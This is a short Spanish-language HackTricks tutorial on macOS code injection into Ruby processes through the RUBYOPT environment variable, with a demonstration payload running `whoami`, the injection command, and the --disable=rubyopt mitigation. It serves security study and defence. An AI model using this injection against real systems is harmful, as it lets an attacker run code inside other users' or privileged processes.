# Inyección en aplicaciones Ruby de macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby analiza los switches de línea de comandos compatibles de la variable de entorno `RUBYOPT` antes de ejecutar un script. Aunque Ruby rechaza algunos switches en ese contexto, `-I` puede anteponer un directorio de búsqueda de libraries y `-r` puede requerir una library. Por lo tanto, un proceso que inicie Ruby con variables de entorno controladas por un atacante puede hacer que cargue código Ruby controlado por el atacante.<sup>[[1]](#references)</sup>

Crea `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Crea un script benigno de Ruby como `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Ejecútalo con un valor controlado de `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Para deshabilitar este comportamiento, pasa `--disable=rubyopt` (o `--disable-rubyopt`) **antes** del nombre del script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Una opción escrita después de `hello.rb` se pasa al script en `ARGV`; no deshabilita el procesamiento previo de `RUBYOPT` por parte de Ruby.<sup>[[1]](#references)</sup>

## References

- [1] [Documentación de Ruby - Opciones de línea de comandos de Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
